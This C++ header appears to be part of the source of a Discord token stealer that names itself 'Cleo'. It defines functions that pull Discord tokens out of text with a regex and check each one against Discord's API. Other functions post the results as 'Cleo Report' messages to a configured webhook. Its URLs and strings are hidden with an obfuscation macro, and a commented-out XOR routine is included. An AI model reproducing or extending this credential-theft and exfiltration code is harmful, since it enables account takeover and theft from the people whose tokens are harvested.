#pragma once
#include "Config.h"
#include <cpr/cpr.h> // CPR include comes with string include etc
#include <WinInet.h>

namespace Modules 
{
	enum class INTERNET_STATUS
	{
		CONNECTED,
		DISCONNECTED,
		CONNECTED_TO_LOCAL,
		CONNECTION_ERROR
	};

	inline INTERNET_STATUS IsConnectedToInternet()
	{
		INTERNET_STATUS connectedStatus = INTERNET_STATUS::CONNECTION_ERROR;
		if (InternetCheckConnection(AY_OBFUSCATE("https://www.google.com"), FLAG_ICC_FORCE_CONNECTION, NULL))
			connectedStatus = INTERNET_STATUS::CONNECTED;
		else
			connectedStatus = INTERNET_STATUS::DISCONNECTED;
		return connectedStatus;
	}

	// Send data to webhook normally
	inline void WebhookSend(const std::string& text)
	{
		cpr::Response r = cpr::Post(cpr::Url { Config::webhook },
			cpr::Payload{ {"content", text} });
	}

	// Send data to webhook in a Cleo report format
	void CleoReport(const std::string& text)
	{
		std::string msg(AY_OBFUSCATE("**Cleo Report** - v"));
		msg.append(Config::version);
		msg.append("\n\n");
		msg.append(text);
		WebhookSend(msg);
	}

	// Used for discord token finding
	inline std::vector<std::string> find_match(const std::string& str, std::regex& reg)
	{
		std::vector<std::string> output;
		std::sregex_iterator currentMatch(str.begin(), str.end(), reg);
		std::sregex_iterator lastMatch;

		while (currentMatch != lastMatch) {
			std::smatch match = *currentMatch;
			output.push_back(match.str());
			currentMatch++;
		}
		return output;
	}

	// Checks if a token is valid, returns true if valid - vice versa
	inline bool CheckToken(const std::string& match)
	{
		cpr::Response res = cpr::Get(cpr::Url{ AY_OBFUSCATE("https://discordapp.com/api/v9/channels/@me") },
			cpr::Header{ {"Content-Type", "application/json"}, {"Authorization", match} });
		if (res.status_code == 400) // 400 is good
			return true;
		return false;
	}

	/*
	[[maybe_unused]] inline std::string xorstring(std::string& input, const std::string& key) {
		if (key.size() == 0) return input;
		for (uint32_t i = 0; i < input.size(); i++)
			input[i] ^= key[i % key.length()];
		return input;
	}
	*/
}